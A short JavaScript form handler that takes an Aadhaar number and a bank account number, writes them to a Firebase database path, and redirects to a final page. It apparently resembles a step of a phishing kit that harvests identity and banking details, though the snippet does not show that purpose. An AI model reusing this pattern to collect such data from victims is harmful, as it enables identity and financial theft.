// Handle Step 2 Form Submission
document.getElementById("step2Form").addEventListener("submit", function (e) {
  e.preventDefault();

  const aadhaar = document.getElementById("aadhaar").value;
  const account = document.getElementById("account").value;
  const key = localStorage.getItem("firebaseKey");

  if (!key) {
    alert("No user session found. Please start from Step 1.");
    return;
  }

  const ref = firebase.database().ref("ududip007/" + key);
  ref.update({
    d_aadhaar: aadhaar,
    e_AC: account
  }).then(() => {
    window.location.href = "last.html"; // Redirect after success
  }).catch((error) => {
    alert("Error updating data: " + error.message);
  });
});
